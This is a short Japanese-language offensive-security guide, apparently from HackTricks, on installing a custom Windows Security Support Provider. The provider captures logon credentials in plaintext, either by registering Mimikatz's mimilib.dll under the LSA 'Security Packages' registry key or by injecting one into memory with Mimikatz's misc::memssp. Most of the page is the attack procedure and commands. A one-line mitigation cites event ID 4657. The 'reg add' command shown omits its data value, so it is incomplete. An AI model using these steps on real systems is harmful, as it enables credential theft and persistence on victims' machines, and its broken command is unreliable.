# カスタム SSP

{{#include ../../banners/hacktricks-training.md}}

### カスタム SSP

[SSP (セキュリティサポートプロバイダー) についてはこちらで学んでください。](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
**自分の SSP** を作成して、マシンにアクセスするために使用される **資格情報** を **平文** で **キャプチャ** できます。

#### Mimilib

Mimikatz によって提供される `mimilib.dll` バイナリを使用できます。**これにより、すべての資格情報が平文でファイルにログされます。**\
dll を `C:\Windows\System32\` に配置します。\
既存の LSA セキュリティパッケージのリストを取得します：
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
`mimilib.dll`をセキュリティサポートプロバイダーリスト（セキュリティパッケージ）に追加します：
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
再起動後、すべての資格情報は `C:\Windows\System32\kiwissp.log` に平文で見つけることができます。

#### メモリ内

Mimikatzを使用して、これをメモリ内に直接注入することもできます（少し不安定で動作しない可能性があることに注意してください）：
```powershell
privilege::debug
misc::memssp
```
これは再起動では生き残りません。

#### 緩和策

イベントID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` の監査作成/変更

{{#include ../../banners/hacktricks-training.md}}
